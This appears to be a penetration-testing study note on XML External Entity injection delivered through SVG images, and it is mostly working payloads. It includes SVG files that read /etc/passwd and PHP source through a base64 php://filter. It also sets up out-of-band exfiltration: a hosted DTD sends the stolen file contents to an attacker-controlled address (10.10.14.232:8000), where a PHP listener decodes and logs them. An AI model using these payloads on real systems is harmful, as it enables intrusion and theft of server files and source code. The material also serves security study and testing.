#### XML External Entity Injection
---
Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Once the SVG image is displayed, we should get the base64 encoded content ofÂ `index.php`, which we can decode to read the source code.

## OOB Exfiltration

Out of band exfiltration may be achieved by referencing external entities hosted on our local machines and then joining the data with exfiltrated data from the target server.

First, the `Document Type Definition` file `xxe.dtd` must be hosted and served locally:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.232:8000/?content=%file;'>">
```

An `index.php` file is also useful for processing the base64 encoded payload:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Command to host PHP server:
```shell
php -S 0.0.0.0:8000
```

Then, the following payload is made to the endpoint:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.232:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
